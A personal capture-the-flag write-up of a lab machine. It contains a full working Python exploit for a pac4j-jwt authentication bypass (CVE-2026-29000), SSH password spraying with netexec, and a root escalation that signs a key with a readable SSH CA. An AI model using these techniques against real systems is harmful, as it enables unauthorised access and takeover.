#### info enum

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty

on port 80, a auth platform is running, pac4j
it vuln to CVE-2026-29000. I cannot create the poc with the info I googled. copy one from writup....
```
#!/usr/bin/env python3
"""CVE-2026-29000 - pac4j-jwt Authentication Bypass"""
import json
import time
import base64
import requests
from jwcrypto import jwk, jwe
import sys
TARGET = sys.argv[1]
# Step 1: Fetch the RSA public key from JWKS
print("[*] Fetching JWKS...")
resp = requests.get(f"{TARGET}/api/auth/jwks")
jwks_data = resp.json()
key_data = jwks_data['keys'][0]
pub_key = jwk.JWK(**key_data)
print(f"[+] Got RSA public key (kid: {key_data['kid']})")
# Step 2: Craft a PlainJWT with admin claims
def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode() 

now = int(time.time())
header = b64url_encode(json.dumps({"alg": "none"}).encode())
payload = b64url_encode(json.dumps({
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now,
    "exp": now + 3600
}).encode())
plain_jwt = f"{header}.{payload}."
print(f"[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN")
# Step 3: Wrap in JWE encrypted with server's RSA public key
jwe_token = jwe.JWE(
    plain_jwt.encode(),
    recipient=pub_key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "kid": key_data['kid'],
        "cty": "JWT"
    })
)
forged_token = jwe_token.serialize(compact=True)
print(f"[+] Forged JWE token created")
# Step 4: Access protected endpoints
headers = {"Authorization": f"Bearer {forged_token}"}
print("\n[*] Accessing /api/dashboard...")
resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)
print(f"[+] Status: {resp.status_code}")
data = resp.json()
print(f"[+] Authenticated as: {data['user']['username']} ({data['user']['role']})")
print(f"[+] Token: {forged_token}")
```
  
`─$ python3 ex.py http://10.129.7.64:8080`
```
[*] Fetching JWKS...
[+] Got RSA public key (kid: enc-key-1)
[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN
[+] Forged JWE token created

[*] Accessing /api/dashboard...
[+] Status: 200
[+] Authenticated as: admin (ROLE_ADMIN)
[+] Token: eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImtpZCI6ICJlbmMta2V5LTEiLCAiY3R5IjogIkpXVCJ9.RStKEGp6rTewkuhmRjIPqElkgxjcabDALOXq8v46AtiVCxus0BFxd5ePuZNR9GRKKQosjTiHrSWssiW4U2hsfphhjLy0GgY8OfjVvFe5B34cBdQIS-BGCX53tOG2UxAKuV_prGLPjFzIi5yl-wuKGIYH94GUV5Fg2suzDGVn0BXt781uhgvUXfUZIBIUMLi8wH2V2CFugDcEMlWmuHPrxpjx4_gictEpSHFTLBADO4jq6ReeMTRmzlamuJFYI7Wb3zcvWmsB7fp6X13VwWoPjgXbwc8Lk82TZzcSoVXbKpwIxKwNcFXDTKa4d_dL82z-IDD_j6TYI0VsKjfiTSQBLg.7WorsUd_BuXmdfKI.jZratg4bSguYGiSwGfMdytzEP_GU1FnW6-U1asTHHIsSD51_G9Y2uvFna69DL6bGa4MCF0GOJp7wwNeqyIkpaRJow2ZZBfiiftCo51JsbusAZvjpse7AtohM37x0IrvmsDbHbfYKbD8L9_4CtUu9C-mKPlWSEO7isaBfR7aOkDsIYiWMlXPSY3ISe4BOvzao1SdzoevpBOJ-yZz2mrT5jQEt.SWGIjUAQDezmCGKxfnu9QA
```

#### foothlod
set this token into application/session storage as key:auth_token Value:xxxx

get info from the dashboard pageXOffset.
```
Security
    authFramework
        pac4j-jwt   
    authFrameworkVersion
        6.0.3
    jwtAlgorithm
        RS256
    jweAlgorithm
         RSA-OAEP-256
    jweEncryption
        A128GCM
    encryptionKey
        D3pl0y_$$H_Now42!
    tokenExpiry
        3600s
    sessionManagement
        stateless
```
and a user list from the dashboard
```
svc-deploy
jthompson
amorales
bwright
kkumar
mwilson
lzhang
```
use nxc to spray the ssh port
```
└─$ netexec ssh 10.129.7.64 -u user.txt -p 'D3pl0y_$$H_Now42!'     
SSH         10.129.7.64     22     10.129.7.64      [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
SSH         10.129.7.64     22     10.129.7.64      [+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access!
```
`svc-deploy@principal:~$ cat /etc/passwd | grep bash`
```
root:x:0:0:root:/root:/bin/bash
svc-deploy:x:1001:1002::/home/svc-deploy:/bin/bash
```

#### privi escalate
`svc-deploy@principal:~$ id`
```
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```
As the group is speacial, and I donot find anything useful from linpeas
`svc-deploy@principal:~$ find / -group deployers 2>/dev/null`
```
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
```
all the privi is about sshd config
`svc-deploy@principal:~$ ls -l /opt/principal/ssh`
```
total 12
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub

svc-deploy@principal:/opt/principal/ssh$ cat README.txt 
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
```

`svc-deploy@principal:/etc/ssh/sshd_config.d$ ls`
```
50-cloud-init.conf  60-principal.conf

svc-deploy@principal:/etc/ssh/sshd_config.d$ cat 60-principal.conf 
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```
in order escalate our privileges we will generate a new SSH key pair, sign the public key with the CA and specify root as the principal

`svc-deploy@principal:/tmp$ ssh-keygen -t ed25519 `
```
Generating public/private ed25519 key pair.
```
`svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca -I "for-root" -n root -V +5h /tmp/ed.pub`
```
Signed user key /tmp/ed-cert.pub: id "for-root" serial 0 for root valid from 2026-03-20T06:55:00 to 2026-03-20T11:56:06
```
check the signed pub key
`svc-deploy@principal:/tmp$ ssh-keygen -L -f ed-cert.pub `
```
ed-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:U5Qf0PdPTgXWXci2QwQKu+izbnH3OyTmSAXnv+/wp2I
        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps (using rsa-sha2-512)
        Key ID: "for-root"
        Serial: 0
        Valid: from 2026-03-20T06:55:00 to 2026-03-20T11:56:06
        Principals: 
                root
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc
```
`svc-deploy@principal:/tmp$ ssh -i ed root@localhost`
```
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
```
#### lesson learned
- sshd config 
